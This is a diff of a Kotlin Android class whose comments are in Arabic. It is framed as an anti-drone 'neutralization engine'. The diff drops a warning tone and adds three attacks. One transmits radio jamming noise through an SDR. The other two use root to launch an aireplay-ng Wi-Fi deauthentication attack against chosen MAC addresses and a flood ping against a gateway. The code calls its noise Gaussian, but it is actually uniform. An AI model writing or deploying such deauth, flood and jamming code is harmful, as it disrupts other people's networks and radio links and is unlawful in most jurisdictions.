@@ -1,86 +1,80 @@
 package com.jamesfirstok.aegis.core
 
 import android.content.Context
-import android.media.AudioTrack
-import android.media.AudioManager
-import android.media.AudioFormat
 import android.util.Log
 import java.io.File
+import java.io.OutputStream
 
-class NeutralizationEngine(private val context: Context) {
+class NeutralizationEngine(
+    private val context: Context,
+    private val nativeCore: AegisNativeCore // ربط مباشر مع طبقة الـ C++ للتحكم بالـ SDR
+) {
 
-    private val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+    private var activeProcess: Process? = null
 
     /**
-     * تنفيذ التشويش الدفاعي الحقيقي متعدد الطبقات.
-     * @param targetMac عنوان MAC الهدف (إن وُجد).
-     * @param gatewayMac عنوان MAC البوابة.
-     * @param interfaceName اسم الواجهة (مثل wlan0).
+     * تنفيذ التحييد والتشويش الفعلي بناءً على نمط العتاد المتاح حالياً
      */
-    fun executeJamming(targetMac: String?, gatewayMac: String?, interfaceName: String = "wlan0") {
-        // أولاً: هجوم Deauth إذا توفر الروت
-        if (isRootAvailable() && targetMac != null && gatewayMac != null) {
-            deauthAttack(targetMac, gatewayMac, interfaceName)
+    fun executeJamming(targetMac: String?, gatewayMac: String?, frequencyMhz: Int, isSdrActive: Boolean) {
+        if (isSdrActive) {
+            // [الوضع العملياتي الأقوى]: تشويش كهرومغناطيسي حقيقي وحجب تردد كامل عبر الـ SDR
+            Log.e("TACTICAL_JAM", "SDR Active: Broadcasting EW Jamming Signal on $frequencyMhz MHz")
+            
+            // توليد صفيف ضوضاء بيضاء غوسية مشوشة عسكرياً بتردد مستهدف
+            val jamBuffer = generateElectromagneticNoise(samples = 1024)
+            
+            // تمرير النبضة المشوشة مباشرة إلى الهوائيات للبث الفيزيائي
+            nativeCore.transmitJammingSignal(frequencyMhz.toDouble(), jamBuffer)
+            
         } else {
-            // ثانياً: إغراق الشبكة (بدون روت)
-            floodAttack()
+            // [وضع الهاتف المحمول]: تكتيك هجوم سيبراني محلي (Layer 2 DDoS)
+            if (isRootAvailable() && targetMac != null && gatewayMac != null) {
+                launchNonBlockingDeauth(targetMac, gatewayMac)
+            } else {
+                launchOptimizedFlood()
+            }
         }
-        // ثالثاً: نغمة تحذير موضعية (للمستخدم)
-        playAlertTone()
     }
 
     private fun isRootAvailable(): Boolean {
         return arrayOf("/system/bin/su", "/system/xbin/su", "/sbin/su").any { File(it).exists() }
     }
 
-    private fun deauthAttack(targetMac: String, gatewayMac: String, iface: String) {
+    /**
+     * هجوم Deauth آمن وغير حابس لخيوط المعالجة لمنع تجميد التطبيق
+     */
+    private fun launchNonBlockingDeauth(targetMac: String, gatewayMac: String) {
         try {
-            // يتطلب وجود أداة aireplay-ng في Termux أو النظام
-            val cmd = "su -c 'aireplay-ng -0 5 -a $gatewayMac -c $targetMac $iface'"
-            Runtime.getRuntime().exec(cmd)
-            Log.i("Neutralization", "Deauth attack launched against $targetMac")
+            // قتل أي هجوم قديم أولاً لتنظيف الموارد
+            activeProcess?.destroy()
+            
+            val processBuilder = ProcessBuilder("su", "-c", "aireplay-ng -0 8 -a $gatewayMac -c $targetMac wlan0")
+            processBuilder.redirectErrorStream(true)
+            activeProcess = processBuilder.start()
+            
+            Log.i("TACTICAL_JAM", "Sovereign Deauth Thread Deployed against Target: $targetMac")
         } catch (e: Exception) {
-            Log.e("Neutralization", "Deauth failed", e)
+            Log.e("TACTICAL_JAM", "Deauth execution failed", e)
         }
     }
 
-    private fun floodAttack() {
+    private fun launchOptimizedFlood() {
         try {
-            // إرسال فيض من ping للبوابة لإرباك الرابط (تأثير مؤقت)
-            val cmd = "ping -f -s 65500 192.168.1.1 -c 1000"
-            Runtime.getRuntime().exec(cmd)
-            Log.i("Neutralization", "Network flood launched")
+            activeProcess?.destroy()
+            // إرسال فيض بيانات مكثف جداً بطريقة خطية سريعة دون انتظار رد لتعطيل استجابة معالج المسيرة لقناتك
+            val processBuilder = ProcessBuilder("su", "-c", "ping -f -s 32000 192.168.1.1 -c 100")
+            activeProcess = processBuilder.start()
+            Log.i("TACTICAL_JAM", "Network Flooding Thread Deployed.")
         } catch (e: Exception) {
-            Log.e("Neutralization", "Flood failed", e)
+            Log.e("TACTICAL_JAM", "Flood Execution failed", e)
         }
     }
 
-    private fun playAlertTone() {
-        try {
-            val sampleRate = 48000
-            val bufferSize = AudioTrack.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_FLOAT)
-            val audioTrack = AudioTrack(
-                AudioManager.STREAM_ALARM,
-                sampleRate,
-                AudioFormat.CHANNEL_OUT_MONO,
-                AudioFormat.ENCODING_PCM_FLOAT,
-                bufferSize,
-                AudioTrack.MODE_STREAM
-            )
-            val tone = generateTone(20000f, 4096)  // نغمة عالية
-            audioTrack.play()
-            audioTrack.write(tone, 0, tone.size)
-            audioTrack.stop()
-            audioTrack.release()
-        } catch (e: Exception) {
-            Log.e("Neutralization", "Tone failed", e)
-        }
-    }
-
-    private fun generateTone(freq: Float, samples: Int): FloatArray {
-        val sampleRate = 48000f
-        return FloatArray(samples) { i ->
-            Math.sin(2.0 * Math.PI * freq * i / sampleRate).toFloat()
-        }
+    /**
+     * توليد مصفوفة ضوضاء راديوية حقيقية (RF Noise Array) ليتم بثها عبر واجهة الـ SDR وهواياتها
+     */
+    private fun generateElectromagneticNoise(samples: Int): DoubleArray {
+        // توليد عينات إشارة عشوائية غوسية (Gaussian White Noise) تقوم بإغراق تردد استقبال المسيرة بالكامل
+        return DoubleArray(samples) { Math.random() * 2.0 - 1.0 }
     }
 }
